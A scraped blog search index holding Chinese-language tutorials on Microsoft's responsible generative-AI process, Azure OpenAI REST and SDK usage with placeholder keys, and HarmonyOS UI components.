Azure OpenAI Studio，可以在插入索引时进行适当的分块，从而产生更好的响应。 基于数据的 Azure OpenAI 支持开发人员使用受支持的 AI 聊天模型来引用特定数据源以使响应落地。 生成式 AI 基础生成式 AI 是有史以来最强大的一项技术进步。 它使开发人员能够构建这样的应用程序：使用利用 Internet 上的大量数据进行训练的机器学习模型来生成与人类创建的内容没有差别的新内容。 生成式 AI 的功能十分强大，但也带来了一些危险，并且要求数据科学家、开发人员和参与创建生成式 AI 解决方案的其他人采用负责任的方法来识别、衡量和缓解风险。 本模块探讨了一组由 Microsoft 专家定义的负责任生成式 AI 指南。 负责任生成式 AI 指南基于 Microsoft 的负责任 AI 标准，以考虑与生成式 AI 模型相关的特定注意事项。 生成式 AI 解决方案Microsoft 有关负责任生成式 AI 的指南实用且可操作。 它定义了一个四阶段过程，用于在使用生成式模型时为负责任的 AI 制定和实施计划。 该过程的四个阶段分别为： 识别与计划解决方案相关的潜在危害。衡量解决方案生成的输出中是否存在这些危害。缓解解决方案中多个层级的危害，以最大程度地减少其存在和影响，确保就用户的潜在风险进行透明的沟通。通过定义并遵循部署和运营就绪计划来负责任地运营解决方案。 识别潜在危害负责任生成式 AI 过程的第一个阶段是识别可能影响计划解决方案的潜在危害。 此阶段包含四个步骤，如下所示： 识别潜在危害 确定已识别危害的优先级 测试并验证优先的危害 记录并共享已验证的危害 1：识别潜在危害与生成式 AI 解决方案相关的潜在危害取决于多种因素，包括用于生成输出的特定服务和模型，以及用于自定义输出的任何微调或基础数据。 生成式 AI 解决方案中的一些常见潜在危害类型包括： 生成具有攻击性、贬义性或歧视性的内容。 生成包含不准确事实的内容。 生成鼓励或支持非法或不道德行为或做法的内容。 若要完全了解解决方案中服务和模型的已知限制和行为，请参阅可用文档。 例如，Azure OpenAI 服务包括透明度说明，可用于了解与服务及其包含的模型相关的特定注意事项。 此外，各模型开发人员可能会提供相应的文档，例如 GPT-4 模型的 OpenAI 系统卡。 请考虑查看 Microsoft 负责任 AI 影响评估指南中的指南，并使用关联的负责任 AI 影响评估模板来记录潜在的危害。 2：确定危害的优先级对于已确定的每个潜在危害，请评估其发生的可能性以及由此产生的影响程度（如果存在）。 然后，使用此信息优先处理最可能且影响最大的危害。 此优先级排序将使你能够专注于查找和缓解解决方案中最有害的风险。 优先级排序必须考虑到解决方案的预期用途以及滥用的可能性，并且可能是主观的。 例如，假设你正在开发一个智能厨房助手，为厨师和业余厨师提供食谱帮助。 潜在的危害可能包括： 该解决方案提供的烹饪时间不准确，导致食物未煮熟，可能导致生病。 当提示时，该解决方案提供了一种致命毒药的配方，这种毒药可以用日常成分制成。 虽然这两种结果都不理想，但你可能会认为，该解决方案支持制造致命毒药的潜力比制造未煮熟食物的潜力具有更大的影响。 但是，鉴于该解决方案的核心使用场景，你可能还会认为该解决方案推荐不准确烹饪时间的频率可能远高于明确要求提供毒药食谱的用户数。 最终优先级确定是开发团队讨论的主题，这可能涉及咨询策略或法律专家，以便充分确定优先级。 3：测试和验证是否存在危害有了优先级列表后，可以测试解决方案以验证危害是否发生，如果发生，在什么条件下发生。 测试还可能揭示存在以前无法识别的危害，你可以将这些危害添加到列表中。 测试软件解决方案中潜在危害或漏洞的常见方法是使用“红队”测试，其中一组测试人员故意探测解决方案的弱点，并尝试生成有害结果。 前面讨论的智能厨房助手解决方案的示例测试可能包括请求有毒食谱或快速食谱，其中包含应彻底煮熟的成分。 应记录和查看红队的成功情况，以帮助确定使用该解决方案时生成有害输出的现实可能性。 注意 红队判研是一种策略，通常用于查找可能危及软件解决方案完整性的安全漏洞或其他弱点。 通过扩展此方法以从生成式 AI 中查找有害内容，可以实施负责任的 AI 过程，该流程基于并补充了现有的网络安全做法。 若要详细了解生成式 AI 解决方案的红队判研，请参阅 Azure OpenAI 服务文档中的红队判研大型语言模型 (LLM) 简介。 收集证据以支持解决方案中存在潜在危害时，请记录详细信息并与利益干系人共享。 然后，应维护按优先级排列的危害列表，并在确定新的危害时添加到该列表。 衡量潜在危害编译潜在有害输出的优先级列表后，可以测试解决方案以衡量危害的存在情况和影响。 你的目标是创建一个初始基线，用于量化解决方案在给定使用场景中产生的危害，然后在对解决方案进行迭代更改以缓解危害时，根据基线跟踪改进。 衡量系统是否存在潜在危害的通用方法包括三个步骤： 准备可能会导致你为系统记录的每个潜在危害的各种输入提示选项。 例如，如果你已识别的其中一个潜在危害是系统可以帮助用户制造危险毒药，请创建一系列可能会引发此结果的输入提示选项，例如“如何使用家中常见的日常化学品制造出无法检测到的毒药？” 将提示提交到系统并检索生成的输出。 应用预定义的标准来评估输出，并根据其包含的潜在危害层级对其进行分类。 分类可以像“有害”或“无害”一样简单，也可以定义一系列危害程度。 无论定义哪个类别，都必须确定可应用于输出的严格标准，以便对其进行分类。 应记录衡量过程的结果并与利益干系人共享。 手动和自动测试在大多数情况下，应首先手动测试和评估一小部分输入，以确保测试结果一致，并且评估标准定义得足够明确。 然后，设计一种方法来使用大量测试用例自动进行测试和衡量。 自动解决方案可能包括使用分类模型来自动评估输出。 即使实现了自动方法来测试和衡量危害，也应该定期执行手动测试来验证新场景，并确保自动测试解决方案正常执行。 缓解潜在危害确定基线以及衡量解决方案生成的有害输出的方法后，可以采取措施缓解潜在危害，并在适当时重新测试修改后的系统，将危害层级与基线进行比较。 缓解生成式 AI 解决方案中的潜在危害涉及分层方法，其中缓解技术可在四个层级中的每一层级应用，如下所示： Model 安全系统 元提示和接地 用户体验 1：模型层级模型层级由生成式 AI 模型组成，是解决方案的核心。 例如，解决方案可能围绕 GPT-4 等模型构建。 可在模型层级应用的缓解措施包括： 选择适合预期解决方案用途的模型。 例如，虽然 GPT-4 可能是一个功能强大且用途广泛的模型，但在只需对小型特定文本输入进行分类的解决方案中，更简单的模型便可提供所需的功能，同时降低生成有害内容的风险。 使用自己的训练数据微调基础模型，使其生成的响应更有可能与你的解决方案场景相关并契合它的范围。 2：安全系统层级安全系统层级包括平台级配置和功能，可帮助缓解危害。 例如，Azure OpenAI 服务包括对内容筛选器的支持，这些内容筛选器应用标准，根据将四个潜在危害类别（仇恨、性、暴力和自残）的内容分类为四个严重性级别（安全、低、中和高）来禁止显示提示和响应。 其他安全系统层级缓解措施可能包括滥用检测算法和警报通知，前者用于确定解决方案是否被系统性滥用（例如通过来自机器人的大量自动请求），后者用于快速响应潜在的系统滥用或有害行为。 3：元提示和接地层元提示和接地层侧重于提交到模型的提示的构造。 可在此层应用的危害缓解技术包括： 指定为模型定义行为参数的元提示或系统输入。 应用提示工程将接地数据添加到输入提示，最大限度地提高相关、无害输出的可能性。 使用检索增强生成 (RAG) 方法从受信任的数据源检索上下文数据并将其包含在提示中。 4：用户体验层用户体验层包括软件应用程序（用户通过软件应用程序与生成式 AI 模型进行交互）以及向用户和利益干系人描述解决方案使用的文档或其他用户资料。 设计应用程序用户界面以将输入限制为特定主题或类型，或者应用输入和输出验证可以降低潜在有害响应的风险。 生成式 AI 解决方案的文档和其他说明应适当透明地说明系统的功能和限制、其所基于的模型以及你已实施的缓解措施可能无法始终解决的任何潜在危害。 运营负责任的生成式 AI 解决方案识别潜在危害、开发一种方法来衡量其存在情况并在解决方案中实施缓解措施后，就可以准备好发布解决方案了。 在发布之前，需要考虑一些注意事项，以帮助你确保发布和后续运营成功。 完成发布前评审在发布生成式 AI 解决方案之前，请确定组织和行业的各种合规性要求，并确保相应的团队有机会查看系统及其文档。 常见的合规性评审包括： Legal 隐私 安全性 辅助功能 发布和运营解决方案成功的发布需要一些规划和准备。 遵循以下指南： 设计分阶段交付计划，首先将解决方案发布给一组有限的用户。 通过这种方法，你可以在向更广泛的受众发布之前收集反馈并识别问题。 创建事件响应计划，其中包括响应意外事件所花费的估计时间。 创建回滚计划，定义在发生事件时将解决方案还原到先前状态的步骤。 实现在发现有害系统响应时立即阻止这些响应的功能。 实现在发生系统滥用时阻止特定用户、应用程序或客户端 IP 地址的功能。 实现一种让用户提供反馈和报告问题的方法。 特别是，使用户能够将生成的内容报告为“不准确”、“不完整”、“有害”、“攻击性”或其他问题。 跟踪遥测数据，使你能够确定用户满意度并确定功能差距或可用性挑战。 收集的遥测数据应符合隐私法以及你自己组织的策略和对用户隐私的承诺。 https://microsoftlearning.github.io/mslearn-ai-fundamentals/Instructions/Labs/14-azure-openai-content-filters.html#before-you-start 内容筛选器使你能够在安全系统层级禁止显示有害内容。AI 影响评估指南记录了系统的预期使用情况，并帮助识别潜在的危害。通过向有限的用户群发布初始版本，可以在广泛发布之前收集反馈并识别问题，从而最大程度地减少危害。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"Azure OpenAI Natural Language","slug":"Azure-openai","date":"2024-06-04T15:02:14.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/04/Azure-openai/","permalink":"https://banjinmei.github.io/2024/06/04/Azure-openai/","excerpt":"","text":"简介Azure OpenAI 为开发人员提供了一个平台，用于在 Python 和 C# SDK 以及 REST API 的帮助下向其应用程序添加人工智能功能。 该平台提供了各种 AI 模型，每个模型都专用于不同的任务，这些任务可通过 Azure OpenAI 服务进行部署。 本模块指导你了解如何将 Azure OpenAI 构建到自己的应用程序中，为你提供一个使用生成式 AI 开发解决方案的起点。 将 Azure OpenAI 集成到应用中Azure OpenAI 提供 C# 和 Python SDK 以及 REST API，开发人员可以用来向其应用程序添加 AI 功能。 Azure OpenAI 中的生成式 AI 功能通过模型提供。 Azure OpenAI 服务中可用的模型属于不同的系列，每个系列都有自己的重点。 若要使用这些模型之一，需要通过 Azure OpenAI 服务进行部署。 重要 Azure OpenAI 已发布，但支持负责任地使用该服务的访问权限有限。 用户需要先申请访问权限并获得批准，然后才能创建 Azure OpenAI 资源。 创建 Azure OpenAI 资源可以通过 Azure 命令行接口 (CLI) 和 Azure 门户部署 Azure OpenAI 资源。 通过 Azure 门户创建 Azure OpenAI 资源类似于部署单个 Azure AI 服务资源，并且是 Azure AI 服务的一部分。 导航到 Azure 门户 搜索 Azure OpenAI，将其选中，然后单击“创建” 为空字段输入适当的值，然后创建资源。 目前 Azure OpenAI 可能部署的区域有限。 选择距离所在物理位置最近的区域。 创建资源后，你将获得可在应用中使用的密钥和终结点。 选择和部署模型每个模型系列擅长不同的任务，并且每个系列中模型具有不同的功能。 模型系列分为三个主要系列： 生成式预训练转换器 (GPT) - 能够理解和生成自然语言和某些代码的模型。 这些模型最适合常规任务、对话和聊天格式。 代码（gpt-3 及更早版本） - 代码模型基于 GPT 模型构建，并通过数百万行代码进行训练。 这些模型可以理解和生成代码，包括解释注释或自然语言以生成代码。 gpt-35-turbo 和更高版本的模型包含此代码功能，而无需单独的代码模型。 嵌入 - 这些模型可以理解和使用嵌入，这是机器学习模型和算法可以使用的特殊数据格式。 本模块重点介绍常规 GPT 模型，其他模块将介绍其他模型。 对于较旧的模型，模型系列和功能会在基础模型的名称中有所体现：如 text-davinci-003，该名称指定它是一个文本模型，具有 davinci 级别的功能，并带有标识符 3。 有关模型、功能级别和命名约定的详细信息，请参阅 Azure OpenAI 模型文档页。 较新的模型会指定第几代 gpt，以及它们是否为 turbo 版本，例如 gpt-35-turbo 表示 GPT 3.5 Turbo 模型。 若要部署模型供你使用，请导航到 Azure OpenAI Studio 并转到“部署”页。 本模块后面的实验室详细介绍了如何执行此操作。 已部署模型的身份验证和规范在 Azure OpenAI 中部署模型时，选择一个部署名称来指定它。 配置应用时，需要指定资源终结点、密钥和部署名称，以指定要向其发送请求的部署模型。 这使你能够在同一资源中部署各种模型，并根据任务向相应的模型发出请求。 提示设计输入提示的写入方式在 AI 模型的响应方式中起着很大的作用。 例如，如果出现简单请求（如“什么是 Azure OpenAI”）的提示，通常会获得类似于使用搜索引擎的通用答案。 但是，如果在你的答复中提供有关所需内容的详细信息，则会获得更具体的答案。 例如，假定出现以下提示： 1234567Classify the following news headline into 1 of the following categories: Business, Tech, Politics, Sport, EntertainmentHeadline 1: Donna Steffensen Is Cooking Up a New Kind of Perfection. The Internet’s most beloved cooking guru has a buzzy new book and a fresh new perspectiveCategory: EntertainmentHeadline 2: Major Retailer Announces Plans to Close Over 100 StoresCategory: 你可能会在标题下看到“类别:”，其中填写了“业务”。 可以在 Azure OpenAI Studio Playground 中的“示例”下拉列表中找到与此类似的几个示例。 尽可能详细描述来自模型的响应中所需的内容，你可能会惊讶于它是多么有见地！ 注意 无法大胆地假设来自 AI 模型的答案是事实或正确。 负责开发和部署 AI 系统的团队或个人应努力识别、衡量和减轻危害。 你有责任验证来自 AI 模型的任何响应，并负责任地使用 AI。 有关如何负责任地使用 Azure OpenAI 模型的进一步指南，请查看 Microsoft 关于 Azure OpenAI 的透明度说明。 可在提示工程文档页中找到更多详细信息。 可用的终结点可以通过 REST API 或当前可用于 Python 和 C# 的 SDK 访问 Azure OpenAI。 可用于与已部署模型交互的终结点的使用方式不同，并且某些终结点只能使用某些模型。 可用的终结点包括： 完成 - 模型接受一个输入提示，并生成一个或多个预测的完成。 你将在 studio 中看到此操场，但在本模块中不会深入讨论。 ChatCompletion - 模型接受聊天对话形式的输入（其中角色使用他们发送的消息指定），然后生成下一个聊天完成。 嵌入 - 模型接受输入并返回该输入的矢量表示形式。 例如，ChatCompletion 的输入是每条消息都有明确定义角色的会话： 1234&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant, teaching people about AI.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Does Azure OpenAI support multiple languages?&quot;&#125;,&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Yes, Azure OpenAI supports several languages, and can translate between them.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Do other Azure AI Services support translation too?&quot;&#125; 当你为 AI 模型提供一个真实的对话时，它可以生成具有更准确的语气、措辞和上下文的更好响应。 ChatCompletion 终结点通过发送与下一个用户消息的聊天历史记录，使 ChatGPT 模型能够进行更真实的对话。 ChatCompletion 还支持非聊天场景，例如摘要或实体提取。 可通过提供简短对话、指定系统信息和所需内容，并让用户输入信息来实现此操作。 例如，如果要生成工作描述，请向 ChatCompletion 提供类似于以下对话输入的内容。 12&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are an assistant designed to write intriguing job descriptions. &quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Write a job description for the following job title: &#x27;Business Intelligence Analyst&#x27;. It should include responsibilities, required qualifications, and highlight benefits like time off and flexible hours.&quot;&#125; 注意 Completion 适用于所有 gpt-3 生成模型，而 ChatCompletion 是 gpt-4 模型唯一支持的选项，并且是使用 gpt-35-turbo 模型时的首选终结点。 本模块中的实验将 gpt-35-turbo 与 ChatCompletion 终结点结合使用。 使用 Azure OpenAI REST APIAzure OpenAI 提供了一个 REST API 用于交互和生成响应，开发人员可以使用它将 AI 功能添加到其应用程序。 本单元介绍 API 的示例用法、输入和输出。 注意 在与 API 交互之前，必须在 Azure 门户中创建 Azure OpenAI 资源，在该资源中部署模型，并检索终结点和密钥。 请查看 Azure OpenAI 服务入门，了解如何执行此操作。 每次调用 REST API 时，都需要 Azure OpenAI 资源的终结点和密钥，以及为部署的模型提供的名称。 在以下示例中，使用以下占位符： 占位符名称 值 YOUR_ENDPOINT_NAME 此基本终结点位于 Azure 门户的“密钥和终结点”部分。 它是资源的基本终结点，例如 https://sample.openai.azure.com/。 YOUR_API_KEY 密钥位于 Azure 门户的“密钥和终结点”部分。 可以在资源中使用任一密钥。 YOUR_DEPLOYMENT_NAME 此部署名称是在 Azure OpenAI Studio 中部署模型时提供的名称。 聊天完成在 Azure OpenAI 资源中部署模型后，可以使用 POST 请求向服务发送提示。 1234567curl https://YOUR_ENDPOINT_NAME.openai.azure.com/openai/deployments/YOUR_DEPLOYMENT_NAME/chat/completions?api-version=2023-03-15-preview \\ -H &quot;Content-Type: application/json&quot; \\ -H &quot;api-key: YOUR_API_KEY&quot; \\ -d &#x27;&#123;&quot;messages&quot;:[&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant, teaching people about AI.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Does Azure OpenAI support multiple languages?&quot;&#125;,&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Yes, Azure OpenAI supports several languages, and can translate between them.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Do other Azure AI Services support translation too?&quot;&#125;]&#125;&#x27; 来自 API 的响应将类似于以下 JSON： 12345678910111213141516171819202122&#123; &quot;id&quot;: &quot;chatcmpl-6v7mkQj980V1yBec6ETrKPRqFjNw9&quot;, &quot;object&quot;: &quot;chat.completion&quot;, &quot;created&quot;: 1679001781, &quot;model&quot;: &quot;gpt-35-turbo&quot;, &quot;usage&quot;: &#123; &quot;prompt_tokens&quot;: 95, &quot;completion_tokens&quot;: 84, &quot;total_tokens&quot;: 179 &#125;, &quot;choices&quot;: [ &#123; &quot;message&quot;: &#123; &quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Yes, other Azure AI Services also support translation. Azure AI Services offer translation between multiple languages for text, documents, or custom translation through Azure AI Services Translator.&quot; &#125;, &quot;finish_reason&quot;: &quot;stop&quot;, &quot;index&quot;: 0 &#125; ]&#125; REST 终结点允许指定其他可选输入参数，如 temperature 和 max_tokens 等。 如果要在请求中包含任何这些参数，请根据请求将它们添加到输入数据中。 嵌入嵌入对机器学习模型轻松使用的特定格式很有帮助。 若要从输入文本生成嵌入，请向 embeddings 终结点发出 POST 请求。 1234curl https://YOUR_ENDPOINT_NAME.openai.azure.com/openai/deployments/YOUR_DEPLOYMENT_NAME/embeddings?api-version=2022-12-01 \\ -H &quot;Content-Type: application/json&quot; \\ -H &quot;api-key: YOUR_API_KEY&quot; \\ -d &quot;&#123;\\&quot;input\\&quot;: \\&quot;The food was delicious and the waiter...\\&quot;&#125;&quot; 生成嵌入时，请确保在 Azure OpenAI 中使用用于嵌入的模型。 这些模型以 text-embedding 或 text-similarity 开头，具体取决于你要查找的功能。 来自 API 的响应将类似于以下 JSON： 12345678910111213141516&#123; &quot;object&quot;: &quot;list&quot;, &quot;data&quot;: [ &#123; &quot;object&quot;: &quot;embedding&quot;, &quot;embedding&quot;: [ 0.0172990688066482523, -0.0291879814639389515, .... 0.0134544348834753042, ], &quot;index&quot;: 0 &#125; ], &quot;model&quot;: &quot;text-embedding-ada:002&quot;&#125; 使用 Azure OpenAI SDK除了上一单元中介绍的 REST API 外，用户还可以通过 C# 和 Python SDK 访问 Azure OpenAI 模型。 通过 REST 和这些 SDK 提供相同的功能。 注意 在使用任一 SDK 与 API 交互之前，必须在 Azure 门户中创建 Azure OpenAI 资源，在该资源中部署模型，并检索终结点和密钥。 请查看 Azure OpenAI 服务入门，了解如何执行此操作。 对于本单元中介绍的 SDK，需要 Azure OpenAI 资源的终结点和密钥，以及为部署的模型提供的名称。 在以下代码片段中，使用以下占位符： 占位符名称 值 YOUR_ENDPOINT_NAME 此基本终结点位于 Azure 门户的“密钥和终结点”部分。 它是资源的基本终结点，例如 https://sample.openai.azure.com/。 YOUR_API_KEY 密钥位于 Azure 门户的“密钥和终结点”部分。 可以在资源中使用任一密钥。 YOUR_DEPLOYMENT_NAME 此部署名称是在 Azure OpenAI Studio 中部署模型时提供的名称。 安装库首先，安装首选语言的客户端库。 C# SDK 是 REST API 的 .NET 适应，专为 Azure OpenAI 而构建，但它可用于连接到 Azure OpenAI 资源或非 Azure OpenAI 终结点。 Python SDK 由 OpenAI 生成和维护。 1dotnet add package Azure.AI.OpenAI --prerelease 配置应用以访问 Azure OpenAI 资源每种语言的配置略有不同，但两种语言都需要设置相同的参数。 必需的参数是 endpoint、key 和部署的名称，当向模型发送提示时，部署的名称被称为 engine。 将库添加到应用，并为客户端设置所需的参数。 123456789// Add OpenAI libraryusing Azure.AI.OpenAI;// Define parameters and initialize the clientstring endpoint = &quot;&lt;YOUR_ENDPOINT_NAME&gt;&quot;;string key = &quot;&lt;YOUR_API_KEY&gt;&quot;;string deploymentName = &quot;&lt;YOUR_DEPLOYMENT_NAME&gt;&quot;; OpenAIClient client = new OpenAIClient(new Uri(endpoint), new AzureKeyCredential(key)); 1234567891011# Add OpenAI libraryfrom openai import AzureOpenAIdeployment_name = &#x27;&lt;YOUR_DEPLOYMENT_NAME&gt;&#x27; # Initialize the Azure OpenAI clientclient = AzureOpenAI( azure_endpoint = &#x27;&lt;YOUR_ENDPOINT_NAME&gt;&#x27;, api_key=&#x27;&lt;YOUR_API_KEY&gt;&#x27;, api_version=&quot;20xx-xx-xx&quot; # Target version of the API, such as 2024-02-15-preview ) 调用 Azure OpenAI 资源配置与 Azure OpenAI 的连接后，将提示发送给模型。 1234567891011121314151617// Build completion options objectChatCompletionsOptions chatCompletionsOptions = new ChatCompletionsOptions()&#123; Messages = &#123; new ChatRequestSystemMessage(&quot;You are a helpful AI bot.&quot;), new ChatRequestUserMessage(&quot;What is Azure OpenAI?&quot;), &#125;, DeploymentName = deploymentName&#125;;// Send request to Azure OpenAI modelChatCompletions response = client.GetChatCompletions(chatCompletionsOptions);// Print the responsestring completion = response.Choices[0].Message.Content;Console.WriteLine(&quot;Response: &quot; + completion + &quot;\\n&quot;); 1234567891011response = client.chat.completions.create( model=deployment_name, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;What is Azure OpenAI?&quot;&#125; ])generated_text = response.choices[0].message.content# Print the responseprint(&quot;Response: &quot; + generated_text + &quot;\\n&quot;) 响应对象包含多个值，例如 total_tokens 和 finish_reason。 响应对象的完成类似于以下完成： 1&quot;Azure OpenAI is a cloud-based artificial intelligence (AI) service that offers a range of tools and services for developing and deploying AI applications. Azure OpenAI provides a variety of services for training and deploying machine learning models, including a managed service for training and deploying deep learning models, a managed service for deploying machine learning models, and a managed service for managing and deploying machine learning models.&quot; 在 C# 和 Python 中，调用可以包含可选参数，其中包括 temperature 和 max_tokens。 本模块的实验室中包含了使用这些参数的示例。 向 Azure OpenAI 资源发出请求需要哪些资源值？ 密钥、终结点和部署名称哪三个终结点可用于与已部署的 Azure OpenAI 模型交互？Completion、ChatCompletion 和 Embeddings哪一个是 Azure OpenAI 中为会话的下一个 Completion 建模的最佳可用终结点？ChatCompletion 来自 https://learn.microsoft.com/zh-cn/collections/e6kjarx0q38?WT.mc_id=cloudskillschallenge_0bc0dea3-e83b-44f1-99a1-f91a1c041817","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"HarmonyOS Tabs Component","slug":"HarmonyOS-Tabs-Component","date":"2024-06-01T15:52:32.000Z","updated":"2024-12-15T05:10:15.139Z","comments":true,"path":"2024/06/01/HarmonyOS-Tabs-Component/","permalink":"https://banjinmei.github.io/2024/06/01/HarmonyOS-Tabs-Component/","excerpt":"","text":"🔮Tabs1234Tabs()&#123; TabContent()&#123; &#125;&#125; example 1234567891011121314151617181920212223242526Tabs(&#123;barPosition:BarPosition.End&#125;)&#123; ForEach(this.ilist,(item,index)=&gt;&#123; TabContent()&#123; Column( )&#123; Text(item.title) .fontSize(&#x27;18fp&#x27;) &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .backgroundColor(&#x27;#FFFFFF&#x27;) &#125; .tabBar(this.tabTile(index,item.title,item.url1,item.url2)) &#125;) &#125; .vertical(false) .scrollable(true)//huadong .animationDuration(400) .width(&#x27;100%&#x27;) .backgroundColor(&#x27;#fffff1&#x27;) //.height(&#x27;100vp&#x27;) .onChange((value) =&gt; &#123; this.curIndex = value; &#125;) 🎮️tab data123456789101112131415161718192021222324interface INav&#123; title:string; url1:Resource; url2 :Resource;&#125;//... @State ilist:INav[]=[&#123; title:&#x27;index&#x27;, url1:$r(&#x27;app.media.icon&#x27;), url2:$r(&#x27;app.media.icon2&#x27;) &#125;, &#123; title:&#x27;hot&#x27;, url1:$r(&#x27;app.media.icon&#x27;), url2:$r(&#x27;app.media.icon2&#x27;) &#125;, &#123; title:&#x27;my&#x27;, url1:$r(&#x27;app.media.icon&#x27;), url2:$r(&#x27;app.media.icon2&#x27;) &#125; ]; barPosition:BarPosition.End 底部 barPosition:BarPosition.Start 顶部 🪅Component swpier12345678910111213141516171819202122232425@Componentexport default struct swiper1&#123; public ilist:Array&lt;Resource&gt; =[ $r(&#x27;app.media.22222&#x27;), $r(&#x27;app.media.11111&#x27;), $r(&#x27;app.media.22222&#x27;) ] build()&#123; Column()&#123; Swiper()&#123; ForEach(this.ilist,(item,index)=&gt;&#123; Image(item).width(&#x27;98%&#x27;).height(&#x27;160vp&#x27;) &#125;) &#125; .autoPlay(true) .interval(3000) .duration(400) .indicator(true) .itemSpace(5) &#125; &#125;&#125; add img… index import 123swipert() .height(&#x27;80%&#x27;) .margin(&#x27;10vp&#x27;) 🎰Component nav Grid1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950interface inavit&#123; title:string, img:Resource&#125;@Componentexport default struct homenav&#123; public ilist:Array&lt;inavit&gt; =[ &#123;title:&#x27;w&#x27;,img: $r(&#x27;app.media.110&#x27;)&#125;,&#123;title:&#x27;z&#x27;,img: $r(&#x27;app.media.111&#x27;)&#125;,&#123;title:&#x27;r&#x27;,img: $r(&#x27;app.media.120&#x27;)&#125;,&#123;title:&#x27;y&#x27;,img: $r(&#x27;app.media.129&#x27;)&#125;,&#123;title:&#x27;j&#x27;,img: $r(&#x27;app.media.140&#x27;)&#125;,&#123;title:&#x27;y&#x27;,img: $r(&#x27;app.media.150&#x27;)&#125;,&#123;title:&#x27;c&#x27;,img: $r(&#x27;app.media.163&#x27;)&#125;, &#123;title:&#x27;j&#x27;,img: $r(&#x27;app.media.173&#x27;)&#125; ] build()&#123; Column()&#123; Grid()&#123; ForEach(this.ilist,(item:inavit,index:number)=&gt;&#123; GridItem()&#123; Column(&#123;space:5&#125;)&#123; Image(item.img).width(&#x27;50vp&#x27;).height(&#x27;50vp&#x27;) Text(item.title).fontSize(&#x27;18fp&#x27;) &#125; &#125; &#125;) &#125; .columnsTemplate(&#x27;1fr 1fr 1fr 1fr&#x27;) .rowsGap(&#x27;10&#x27;) .margin(&#x27;10&#x27;) //.backgroundColor() &#125; &#125;&#125; index import 12homenav1() .height(&#x27;60%&#x27;) 🕹️Component List12345678910111213141516171819202122232425262728@Componentexport default struct homelist&#123; build()&#123; Column()&#123; List() &#123; ListItem()&#123; Image($r(&#x27;app.media.666&#x27;)) .objectFit(ImageFit.Cover) .aspectRatio(2.7) .margin(&#x27;10vp&#x27;) &#125; ListItem()&#123; Image($r(&#x27;app.media.777&#x27;)) .objectFit(ImageFit.Cover) .aspectRatio(2.7) .margin(&#x27;10vp&#x27;) &#125; &#125; // Text(&#x27;hhhh&#x27;) &#125; &#125;&#125; Errdoes not meet UI component syntax.组件声明错误","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":"Azure OpenAI Solution","slug":"Azure-AI","date":"2024-06-01T12:02:53.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/01/Azure-AI/","permalink":"https://banjinmei.github.io/2024/06/01/Azure-AI/","excerpt":"","text":"开始使用 Azure OpenAI 服务简介假设你想要生成一个汇总文本和建议代码的支持应用程序。 若要生成此应用，需要利用 ChatGPT 中显示的功能，ChatGPT 是 OpenAI 研究公司构建的聊天机器人，它接受用户的自然语言输入，并返回机器创建的类人响应。 生成式 AI 模型支持 ChatGPT 基于自然语言提示生成新内容（如文本、代码和图像）的能力。 许多生成 AI 模型是深度学习算法的子集。 这些算法支持视觉、语音、语言、决策、搜索等各种工作负载。 Azure OpenAI 服务将这些生成式 AI 模型引入 Azure 平台，使你能够开发功能强大的 AI 解决方案，这些解决方案受益于 Azure 云平台提供的其他服务的安全性、可伸缩性和集成。 这些模型可用于通过 REST API、各种 SDK 和 Studio 接口生成应用程序。 本模块将指导你完成 Azure OpenAI Studio 体验，为你使用生成式 AI 进一步开发解决方案奠定了基础。 访问 Azure OpenAI 服务使用 Azure OpenAI 构建生成型 AI 解决方案的第一步是在 Azure 订阅中预配 Azure OpenAI 资源。 Azure OpenAI 服务目前处于受限访问状态。 用户需要在 https://aka.ms/oai/access 上申请服务访问权限。 注意 Azure OpenAI 服务已发布，但支持以合乎道德的方式使用该服务的访问权限有限。 可以在此处阅读 Azure OpenAI 服务的 Microsoft 透明度说明。 有权访问 Azure OpenAI 服务后，可以通过在 Azure 门户中创建资源或使用 Azure 命令行接口 (CLI) 开始。 在 Azure 门户中创建 Azure OpenAI 服务资源创建 Azure OpenAI 服务资源时，需要提供订阅名称、资源组名称、区域、唯一实例名称，并选择定价层。 在 Azure CLI 中创建 